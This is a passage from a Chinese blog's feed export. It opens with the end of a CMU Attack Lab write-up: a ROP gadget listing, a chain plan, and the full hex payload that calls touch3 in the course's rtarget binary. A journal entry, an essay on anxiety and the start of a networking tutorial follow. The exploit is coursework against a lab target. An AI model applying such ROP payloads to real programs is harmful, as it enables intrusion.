$0xc390c1c9,%eax&#10;  401afa: c3                    retq   &#10;&#10;0000000000401afb &#60;addval_238&#62;:&#10;  401afb: 8d 87 89 d6 94 d2     lea    -0x2d6b2977(%rdi),%eax&#10;  401b01: c3                    retq   &#10;&#10;0000000000401b02 &#60;setval_404&#62;:&#10;  401b02: c7 07 a9 d6 20 d2     movl   $0xd220d6a9,(%rdi)&#10;  401b08: c3                    retq   &#10;&#10;0000000000401b09 &#60;getval_469&#62;:&#10;  401b09: b8 ad 89 ca 90        mov    $0x90ca89ad,%eax&#10;  401b0e: c3                    retq   &#10;&#10;0000000000401b0f &#60;getval_291&#62;:&#10;  401b0f: b8 03 48 89 e0        mov    $0xe0894803,%eax&#10;  401b14: c3                    retq   &#10;&#10;0000000000401b15 &#60;addval_345&#62;:&#10;  401b15: 8d 87 89 c1 84 d2     lea    -0x2d7b3e77(%rdi),%eax&#10;  401b1b: c3                    retq   &#10;&#10;0000000000401b1c &#60;setval_424&#62;:&#10;  401b1c: c7 07 c4 4c 89 e0     movl   $0xe0894cc4,(%rdi)&#10;  401b22: c3                    retq</span><br></pre></td></tr></table></figure>
<p>具体描述一个整个思路(感谢 @yaoxiuh)</p>
<ol>
<li>拿到 rsp 存着的地址</li>
<li>(然后把这个地址) + (cookie 在 stack 偏移量) pop 到某个寄存器中</li>
<li>然后把这个寄存器的值放到 rdi 中</li>
<li>然后调用 touch3</li>
<li>cookie 要放到 stack 最后面</li>
<li>字符串最后加上 <code>\0</code> 也就是 <code>00000000</code> 来标志结束</li>
</ol>
<p>从第二步到第三步，因为可用的指令的限制，需要借用不同的寄存器来进行转移跳转，最后完成对 <code>%rdi</code> 的赋值，具体的步骤（在我的这份代码里）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rsp</span>, %<span class="literal">rax</span> <span class="number">48</span> <span class="number">89</span> e0 c3    <span class="number">0x401b11</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line"><span class="keyword">pop</span>  %<span class="literal">rax</span>       <span class="number">58</span> c3          <span class="number">0x401a24</span></span><br><span class="line">constant <span class="number">0x48</span></span><br><span class="line">movl %<span class="literal">eax</span>, %<span class="literal">ecx</span> <span class="number">89</span> c1 <span class="number">20</span> c9 c3 <span class="number">0x401a98</span> (<span class="number">20</span> c9 没有影响)</span><br><span class="line">movl %<span class="literal">ecx</span>, %<span class="literal">edx</span> <span class="number">89</span> ca <span class="number">28</span> c0 c3 <span class="number">0x401ac8</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line">movl %<span class="literal">edx</span>, %<span class="literal">esi</span> <span class="number">89</span> d6 <span class="number">38</span> c0 c3 <span class="number">0x401a68</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line"><span class="keyword">lea</span>  (%<span class="literal">rdi</span>, %<span class="literal">rsi</span>, <span class="number">1</span>), %<span class="literal">rax</span>     <span class="number">0x401a48</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line">touch3 的地址</span><br><span class="line">cookie 的字符串</span><br><span class="line">栈底</span><br></pre></td></tr></table></figure>
<p>对应的十六进制代码为（同样需要注意不全十六位的 0，不然会出段错误），这里还有一个需要注意的地方是偏移量，在执行第一句时，<code>%rsp</code> 已经是指向下一句了（指向的是当前的栈顶，正在执行的语句是不需要考虑的），所以可以数出来，在 cookie 之前一共有 9 条指令，每个 8 byte，所以一共的偏移量是 <code>0x48</code>（十进制的 72）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">11</span> <span class="number">1</span>b <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">98</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c8 <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">68</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>然后转换成机器码 <code>./hex2raw &lt; p5.txt &gt; p5r.txt</code>，再执行一次 <code>./rtarget -i p5r.txt</code>，就可以看到结果了：</p>
<p><img src="/images/14554895097953.jpg" alt=""></p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这次作业的两个部分，有不同的难点。利用缓冲区溢出跳转到栈中并在栈中执行代码虽然需要的步骤多一些，但是调试还是比较方便的，可以走一步看一步，根据具体的内存分布来进行处理，就是第三阶段的随机部分可能需要多试几次才能找到正确的存放位置。</p>
<p>ROP 的部分，因为跳转来跳转去，难点在于思路，有了一个大概的思路，就可以利用已有的代码跳来跳去来『凑』出最终的结果了。最后部分需要考虑到偏移量的问题，需要对 <code>%rsp</code> 具体所指向的内存位置有比较清晰地了解，这里我有点犯迷糊，在同学的帮助下才找到了问题所在。不同的字长和位数也有影响，虽然大概的意思差不多，不过我看前一两年的作业中的汇编代码，就和现在的汇编代码有挺大的差异了。</p>
<p>越接近硬件层面，越容不得丝毫差池，越来越多的数值和偏移都变得和机器相关，才更加意识到现在能写几乎与机器无关的代码是多么幸福。不过也不能因为前人的工作就忽略不同机器的差异，还是要多考虑不同的层面，才能写出让更多机器能跑得更快的代码。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>]]>
    
    </summary>
    
      <category term="Attacklab" scheme="http://wdxtub.com/tags/Attacklab/"/>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="习题课" scheme="http://wdxtub.com/tags/%E4%B9%A0%E9%A2%98%E8%AF%BE/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第五周 - Conqueror]]></title>
    <link href="http://wdxtub.com/2016/02/12/conqueror/"/>
    <id>http://wdxtub.com/2016/02/12/conqueror/</id>
    <published>2016-02-13T01:38:33.000Z</published>
    <updated>2016-02-13T12:08:51.000Z</updated>
    <content type="html"><![CDATA[<p>Broken mornings, broken nights and broken days in between. Open ground, the sky is open, makes an open sea.</p>
<a id="more"></a>
<hr>
<p>应该是第一次没有和爸爸妈妈过春节，相信也会是最后一次。虽然尽力做了一大桌菜，但是缺少的东西太多太多，只能通过形式来弥补。锦城虽云乐，不如早还家，每个夜晚，每个应该团聚的节日，才更加深刻地意识到我与家的羁绊到底有多深。说不想家，说不想流泪，说不想窗外事，其实自己根本做不到，既然如此，不妨就勇敢拥抱这个变化莫测的世界。</p>
<p>这周又是漂泊的一周，好在已经适应了助教的工作，课程也渐入佳境，整体来说还是比较轻松的，趁着转机的当头完成了大部分繁琐的日常工作，倒是留下了许多看书和胡思乱想的时间。和朋友聊过科幻之后，恰好 kindle 里有阿西莫夫的《永恒的终结》和《神们自己》，便在九个多小时的飞行时间里彻底神游了两回。科幻的尽头大概就是神学和哲学了，但是以我目前的智力水平，估计入门都有点困难。</p>
<p>对于学习这个事情，我一直都是主张曲线救国的。探索的过程中总会需要问题，很多时候朝着问题笔直前进并不是最好的做法，所谓『曲线』，指的是绕到问题背后去。一定要弄清楚问题的来源，不仅是来龙去脉，更应该是通过问题本身，来观察自己的思维模式还有哪些误区和盲点。问题是解决不完的，但是思维体系是可以逐渐完善的，有了一整套观察问题，思考问题，解决问题的框架，那么大部分问题就不是问题了，小部分问题就是给自己这套框架升级换代的问题了。</p>
<p>俗话说得好，飞机坐得多了，难免遇到延误，在达拉斯转机的时候，大家都在飞机上坐好了，机长通知大家飞机出问题了，得换一架，但是换的那架还不知道在哪。虽说三藩就是最终目的地，不用担心换乘的问题，可是延误总是非常闹心的事情，好在这次一向拖拉的机场不到 90 分钟就让我们重新登机了。</p>
<p>三藩的天气依然好得那么不科学，蓝天白云加上略带凉意的风，即使是坐在街边长凳上等待曲鳖，也非常惬意。这次面试的是一个小公司，虽说小，但其实也成立了十来年了。很多时候我们总是相信自己听说的，却不愿意自己来体验，就找工作这个事儿来说，不同公司都有不同的体验。我也正好借着面试这个光明正大的理由，去观察不同公司的员工，试图从与个体的接触中了解整体。所以对我来说，只要见了面，聊了天，这一趟本身就值回票价了。没有打算留下，所以也不必卑躬屈膝。关于找工作还是有挺多东西值得说道的，这个以后有空慢慢写。</p>
<p>实话说，我不大喜欢异族与二等公民的感觉，但对于『小富即安』的群体性，无能为力。随着走出学校的程度越来越深，总能发现很多问题，是大家都心知肚明，却又视而不见，毕竟没有必要为了一个『不一定对自己更好』的明天，去改变『对自己不错』的今天。</p>
<p>古龙在不止一本书中写过，『当一个男人有了想要一个家的念头时，那么离有个家也不远了』，借用一下，当一个人觉得自己不属于这里时，那么离开也就不远了。这次面试之后应该会休息一段时间好好锻炼下身体了，整天飞来飞去实在是非常遭罪。</p>
<p>红眼航班整个人恍恍惚惚，也就到此打住。</p>
<p>Sky is bright. I feel alive.</p>
<p>于三藩机场墙边，于 Newark 机场充电站旁</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Broken mornings, broken nights and broken days in between. Open ground, the sky is open, makes an open sea.</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="周记" scheme="http://wdxtub.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
      <category term="新生" scheme="http://wdxtub.com/tags/%E6%96%B0%E7%94%9F/"/>
    
      <category term="Gossip" scheme="http://wdxtub.com/categories/Gossip/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不安的终结]]></title>
    <link href="http://wdxtub.com/2016/02/12/end-of-anxiety/"/>
    <id>http://wdxtub.com/2016/02/12/end-of-anxiety/</id>
    <published>2016-02-12T12:05:36.000Z</published>
    <updated>2016-02-12T16:10:01.000Z</updated>
    <content type="html"><![CDATA[<p>当一类事情重复足够多次之后，本能会让我们去选择最安全、最中庸的道路。可是消除了痛苦，也就消除了走向辉煌的可能，这又怎么办呢？</p>
<a id="more"></a>
<hr>
<p>最脆弱不安的时刻，往往也是最接近自己的时刻，但观察自己的过程犹如走钢丝，左一分蒸发，右一分凝结。超然物外已经很难，如何抽离自身，更是值得一生探索。在飞机上经历了回忆杀带来的『臆想恐慌症』之后，抛开封闭环境可能带来的问题，我在想，所谓的不安，到底从哪里来，到哪里去呢？</p>
<p>坏消息是，网上对于不安的讨论，几乎都是『灌鸡汤』；好消息是，我在阿西莫夫的《永恒的终结》中，找到了答案。</p>
<p>所谓不安，大概是预想的和实际发生的不一致，自己却没有办法找到原因，于是胡思乱想的恶性循环就开始了；直到某个契机出现，发现了一个『未必合理』却足以说服自己的理由，这才算『心安理得』。但凡以后再想起某件事，便可以自己用这个『足够好』的理由去搪塞自己。而胡思乱想恐怕是因为过去的经历形成的心理地貌，即使一次次去想去模拟，让自己的心绪像流水一样涌出，因为地貌的缘故，往往只能得到同一个结果，于是逆向合理化开始启动，一切都是那么顺理成章。</p>
<p>这样我们就找到不安的根源——失控，胡思乱想使得心态失控，之后给自己洗脑认为现实也已经失控，最终导致心态爆炸。问题就来了，这种失控有没有可能被控制呢？很遗憾，没有，就像《永恒的终结》中一样，用现在去改变过去，其实是没有太多意义的。生活并非永恒不变，现在也不是唯一的归宿，只是未来无限可能的出发点。只有经过严酷的考验，才能不断前进，高速发展。</p>
<blockquote>
<p>危险的环境和危机感，才是驱使人类不断进步，不断征服新事物的根本动力</p>
</blockquote>
<p>人人都会不安，这是本能，但是本能之上，应该意识到不安的终结并不是避免困难的出现，而是去战胜困难。自信不是把自己当做宠物，当做温室里的花朵来成长，而是相信自己，永远敢于接受下一次的挑战。</p>
<p>从这个角度来看中国历史，漫长的封建社会就类似于某种重复，每个朝代一开始，都会参考前朝的经验去做新的选择，找到『最好』的现实，于是慢慢向着最安全，最中庸，最稳定的结构演变，也就是所谓的『中央集权』。</p>
<p>但是这真的就是某种惯性，也许这么多次的重复，只是为了在下一个瞬间，开启另一个时代，那里没有永恒，更无所谓终结。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>当一类事情重复足够多次之后，本能会让我们去选择最安全、最中庸的道路。可是消除了痛苦，也就消除了走向辉煌的可能，这又怎么办呢？</p>]]>
    
    </summary>
    
      <category term="不安" scheme="http://wdxtub.com/tags/%E4%B8%8D%E5%AE%89/"/>
    
      <category term="困难" scheme="http://wdxtub.com/tags/%E5%9B%B0%E9%9A%BE/"/>
    
      <category term="循环" scheme="http://wdxtub.com/tags/%E5%BE%AA%E7%8E%AF/"/>
    
      <category term="永恒的终结" scheme="http://wdxtub.com/tags/%E6%B0%B8%E6%81%92%E7%9A%84%E7%BB%88%E7%BB%93/"/>
    
      <category term="终结" scheme="http://wdxtub.com/tags/%E7%BB%88%E7%BB%93/"/>
    
      <category term="Thinking" scheme="http://wdxtub.com/categories/Thinking/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[计算机网络]]></title>
    <link href="http://wdxtub.com/2016/02/10/internet-protocol/"/>
    <id>http://wdxtub.com/2016/02/10/internet-protocol/</id>
    <published>2016-02-10T20:51:28.000Z</published>
    <updated>2016-02-11T14:03:07.000Z</updated>
    <content type="html"><![CDATA[<p>这篇文章主要介绍计算机网络的相关知识，因为网络的重要组成不是是协议，所以很大篇幅会是相关协议以及具体的应用。整体的结构基于 <a href="http://www.cnblogs.com/vamei/" target="_blank" rel="external">Vamei</a> 博客中的结构（以及一些配图），加上自己在网络上搜集和日常学习中的一些思考，整理成为本文。</p>
<a id="more"></a>
<hr>
<h2 id="u5206_u5C42_u6A21_u578B"><a href="#u5206_u5C42_u6A21_u578B" class="headerlink" title="分层模型"></a>分层模型</h2><p>首先需要明确的就是，网络通信是基于分层模型的。虽然不同的协议有不同的层级划分（甚至同一种协议也有不同的层级划分），但是都离不开分层。分层的好处有很多，最重要的是能够比较好控制具体实现的复杂度，由于每层之间由事先约定的接口通信，所以其实并不需要在意每层的具体实现。</p>
<p>比较出名的分层模型有 OSI 分层模型和 TCP/IP 分层模型，它们的对应关系如下：</p>
<p><img src="/images/14551385707784.jpg" alt=""></p>
<p>OSI 分层模型将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层（Physics Layer）、数据链路层（Data Link Layer）、网络层（Network Layer）、传输层（Transport Layer）、会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。其中第四层完成数据传送服务，上面三层面向用户。</p>
<p><strong>物理层(physical layer)</strong></p>
<p>所谓的物理层，是指光纤、电缆或者电磁波等真实存在的物理媒介。这些媒介可以传送物理信号，比如亮度、电压或者振幅。对于数字应用来说，我们只需要两种物理信号来分别表示0和1，比如用高电压表示1，低电压表示0，就构成了简单的物理层协议。针对某种媒介，电脑可以有相应的接口，用来接收物理信号，并解读成为0/1序列。</p>
<p><strong>连接层(link layer)</strong></p>
<p>在连接层，信息以帧(frame)为单位传输。所谓的帧，是一段有限的0/1序列。连接层协议的功能就是识别0/1序列中所包含的帧。比如说，根据一定的0/1组合识别出帧的起始和结束。在帧中，有收信地址(Source, SRC)和送信地址(Destination, DST)，还有能够探测错误的校验序列(Frame Check Sequence)。当然，帧中最重要的最重要是所要传输的数据 (payload)。这些数据往往符合更高层协议，供网络的上层使用。与数据相配套，帧中也有数据的类型(Type)信息。连接层协议不关心数据中到底包含什么。帧就像是一个信封，把数据包裹起来。</p>
<p>以太网(Ethernet)和WiFi是现在最常见的连接层协议。通过连接层协议，我们可以建立局域的以太网或者WiFi局域网，并让位于同一局域网络中的两台计算机通信。</p>
<p><strong>网络层(network layer)</strong></p>
<p>如何让WiFi上的一台计算机和以太网上的另一台计算机通信呢？我们需要一个“中间人”。这个“中间人”必须有以下功能: </p>
<ol>
<li>能从物理层上在两个网络的接收和发送0/1序列</li>
<li>能同时理解两种网络的帧格式</li>
</ol>
<p>路由器(router)就是为此而产生的“翻译”。一个路由器有多个网卡(NIC，Network Interface Controller)，每个NIC可以接入多个网络，并理解相应的连接层协议。在帧经过路由到达另一个网络的时候，路由会读取帧的信息，并改写以发送到另一个网络。</p>
<p>整个通信过程如下:</p>
<p>WiFi上的计算机1 -&gt; 路由WiFi接口 -&gt;  路由以太网接口 -&gt; 以太网上的计算机2</p>
<p>在连接层，我们的一个帧中只能记录SRC和DST两个地址。而上面的过程需要经过四个地址 (计算机1，WiFi接口，以太网接口，计算机2)。显然，仅仅靠连接层协议无法满足我们的需要。由于连接层协议开发在先，我们无法改动连接层协议，只能在连接层的数据(payload)下功夫了，IP协议应运而生。</p>
<p><strong>传输层(transport layer)</strong></p>
<p>上面的三层协议让不同的计算机之间可以通信。但计算机中实际上有许多个进程，每个进程都可能有通信的需求(参看Linux进程基础和Linux进程间通信)。</p>
<p>传输层协议，比如TCP和UDP，使用端口号(port number)来识某个进程。在传输数据的时候，我们写上目的进程的端口。当数据到达另一台计算机时，会根据传输层协议，识别端口号，将信送给不同的进程。</p>
<p>TCP和UDP协议是两种不同的传输层协议。UDP 协议比较简单，但是不太可靠；TCP 协议有着相对复杂的握手机制，比较可靠。TCP协议还有控制网络交通等功能。</p>
<p><strong>应用层(application layer)</strong></p>
<p>通过上面的几层协议，我们已经可以在任意两个进程之间进行通信。应用层协议是对数据内容·进一步的用语规范。应用层的协议包括用于Web浏览的HTTP协议，用于传输文件的FTP协议，用于Email的IMAP等等。</p>
<h2 id="u8FDE_u63A5_u5C42_u534F_u8BAE"><a href="#u8FDE_u63A5_u5C42_u534F_u8BAE" class="headerlink" title="连接层协议"></a>连接层协议</h2><p>以太网和WiFi是连接层的两种协议。在连接层，信息以帧(frame)为单位传输。帧像信封一样将数据(payload)包裹起来，并注明收信地址和送信地址。我们先来看看以太网的帧。</p>
<p><strong>以太网的帧格式</strong></p>
<p>帧本身是一段有限的0/1序列。它可以分为 <code>头部 | 数据(Payload) | 尾部</code> 三部分:</p>
<pre><code>Preamble SFD DST SRC Type | Payload(Data) | Pad FCS Extension
</code></pre><p>帧按照上面的顺序从头到尾依次被发送/接收。我们下面进一步解释各个区域。</p>
<p><strong>头部</strong></p>
<p>帧的最初 7 个 byte 被称为序言(preamble)。它的每个byte都是0xAA(这里是十六进制，也就是二进制的10101010)。通常，我们都会预定好以一定的频率发送0/1序列(比如每秒10bit)。如果接收设备以其他频率接收(比如每秒5bit)，那么就会错漏掉应该接收的0/1信息。但是，由于网卡的不同，发送方和接收方即使预订的频率相同，两者也可能由于物理原因发生偏差。这就好像两个人约好的10点见，结果一个人表快，一个人表慢一样。序言是为了让接收设备调整接收频率，以便与发送设备的频率一致，这个过程就叫做时钟复原(recover the clock)。</p>
<p>时钟调整好之后，我们等待帧的起始信号(SFD, start frame delimiter)。SFD是固定的值0xAB。</p>
<p>紧随SFD之后的是 6 byte的目的地(DST, destination)和 6 byte的发出地(SRC, source)。这里写的是对地址的“本地描述”，也就是MAC地址。MAC地址是物理设备自带的序号，只能在同一个以太网中被识别。</p>
<p>头部的最后一个区域是Type，用以说明数据部分的类型。(比如0x0800为IPv4，0x0806为ARP)</p>
<p><strong>数据</strong></p>
<p>数据一般包含有符合更高层协议的数据，比如IP包。连接层协议本身并不在乎数据是什么，它只负责传输。注意，数据尾部可能填充有一串0(PAD区域)。原因是数据需要超过一定的最小长度。</p>
<p><strong>尾部</strong></p>
<p>跟随在数据之后的是校验序列(FCS, Frame Check Sequence)。校验序列是为了检验数据的传输是否发生错误。</p>
<p>一个方法是将数据发送两遍，然后对比一下是否一样。但这样就大大降低了网络的效率。FCS采用了CRC(Cyclic Redundancy Check)算法。CRC 算法也相类似。n 位 CRC 算法取一个 n bit 的因子，比如下面的 1011。数据序列结尾增加 n-1 个 0。因子与数据序列的不断进行 XOR 运算，直到得到n-1位的余数，也就是100。该余数各位取反(011)，然后存储在FCS的位置。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11010011101100</span> <span class="number">000</span> &lt;--- 数据序列末尾增加<span class="number">3</span>位<span class="number">0</span></span><br><span class="line"><span class="number">1011</span>               &lt;--- 因子</span><br><span class="line"><span class="number">01100011101100</span> <span class="number">000</span> &lt;--- XOR结果</span><br><span class="line"> <span class="number">1011</span>              &lt;--- 因子</span><br><span class="line"><span class="number">00111011101100</span> <span class="number">000</span></span><br><span class="line">  <span class="number">1011</span></span><br><span class="line"><span class="number">00010111101100</span> <span class="number">000</span></span><br><span class="line">   <span class="number">1011</span></span><br><span class="line"><span class="number">00000001101100</span> <span class="number">000</span></span><br><span class="line">       <span class="number">1011</span></span><br><span class="line"><span class="number">00000000110100</span> <span class="number">000</span></span><br><span class="line">        <span class="number">1011</span></span><br><span class="line"><span class="number">00000000011000</span> <span class="number">000</span></span><br><span class="line">         <span class="number">1011</span></span><br><span class="line"><span class="number">00000000001110</span> <span class="number">000</span></span><br><span class="line">          <span class="number">1011</span></span><br><span class="line"><span class="number">00000000000101</span> <span class="number">000</span> </span><br><span class="line">           <span class="number">101</span> <span class="number">1</span></span><br><span class="line">-----------------</span><br><span class="line"><span class="number">00000000000000</span> <span class="number">100</span> &lt;--- <span class="number">3</span>位余数</span><br></pre></td></tr></table></figure>
<p>上面例子用的是4位CRC。在Ethernet中使用的因子为32位的，以达到更好的检测效果。</p>
<p><strong>集线器(Hub) vs. 交换器(Switch)</strong></p>
<p>以太网使用集线器或者交换器将帧从发出地传送到目的地。一台集线器或交换器上有多个端口，每个端口都可以连接一台计算机(或其他设备)。</p>
<p>集线器像一个广播电台。一台电脑将帧发送到集线器，集线器会将帧转发到所有其他的端口。每台计算机检查自己的MAC地址是不是符合DST。如果不是，则保持沉默。集线器是比较早期的以太网设备。它有明显的缺陷：</p>
<ol>
<li>任意两台电脑的通信在同一个以太网上是公开的。所有连接在同一个集线器上的设备都能收听到别人在传输什么，这样很不安全。可以通过对信息加密提高安全性。</li>
<li>不允许多路同时通信。如果两台电脑同时向集线器发信，集线器会向所有设备发出“冲突”信息，提醒发生冲突。可以在设备上增加冲突检测算法(collision detection)：一旦设备发现有冲突，则随机等待一段时间再重新发送。</li>
</ol>
<p>交换器克服集线器的缺陷。交换器记录有各个设备的MAC地址。当帧发送到交换器时，交换器会检查DST，然后将帧只发送到对应端口。交换器允许多路同时通信。由于交换器的优越性，交换器基本上取代了集线器。但比较老的以太网还有可能在使用集线器。</p>
<p><strong>WiFi</strong></p>
<p>WiFi的工作方式与集线器连接下的以太网类似。一个WiFi设备会向所有的WiFi设备发送帧，其它的WiFi设备检查自己是否符合DST。由于WiFi采取无线电信号，所以很难像交换器一样定向发送，所以WiFi的安全性很值得关注。WiFi采用加密的方法来实现信息的安全性。</p>
<p>(早期的WEP加密方法非常脆弱，建议使用WPA或者WPA2加密方法。隐藏WiFi设备ID的方法不是很有用。)</p>
<h2 id="u7F51_u7EDC_u5C42_u534F_u8BAE"><a href="#u7F51_u7EDC_u5C42_u534F_u8BAE" class="headerlink" title="网络层协议"></a>网络层协议</h2><p>网络层(network layer)是实现互联网的最重要的一层。正是在网络层面上，各个局域网根据 IP 协议相互连接，最终构成覆盖全球的 Internet。更高层的协议，无论是 TCP 还是 UDP，必须通过网络层的 IP 数据包(datagram)来传递信息。操作系统也会提供该层的 socket，从而允许用户直接操作 IP 包。</p>
<p>IP 数据包是符合 IP 协议的信息(也就是0/1序列)，我们后面简称 IP 数据包为 IP 包。IP 包分为头部(header)和数据(Data)两部分。数据部分是要传送的信息，头部是为了能够实现传输而附加的信息。</p>
<p>IP 协议可以分为 IPv4 和 IPv6 两种。IPv6 是改进版本，用于在未来取代 IPv4 协议。下面是 IPv4的格式</p>
<p><img src="/images/14551392855125.jpg" alt=""></p>
<p>与帧类似，IP 包的头部也有多个区域。我们将注意力放在红色的发出地(source address)和目的地(destination address)。它们都是IP地址。IPv4 的地址为 4 bytes的长度(也就是32位)。我们通常将 IPv4 的地址分为四个十进制的数，每个数的范围为 0-255,比如 192.0.0.1 就是一个 IP 地址。填写在 IP 包头部的是该地址的二进制形式。</p>
<p>IP地址是全球地址，它可以识别局域网和主机。这是通过将IP地址分类实现的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP <span class="keyword">class</span>    From          To                Subnet Mask</span><br><span class="line">A           <span class="number">1.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">126.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B           <span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">C           <span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>每个 IP 地址的 32 位分为前后两部分，第一部分用来区分局域网，第二个部分用来区分该局域网的主机。子网掩码(Subnet Mask)告诉我们这两部分的分界线，比如 255.0.0.0 (也就是8个1和24个0)表示前 8 位用于区分局域网，后 24 位用于区分主机。由于 A、B、C 分类是已经规定好的，所以当一个IP地址属于 B 类范围时，我们就知道它的前 16 位和后 16 位分别表示局域网和主机。</p>
<p><strong>网卡与路由器</strong></p>
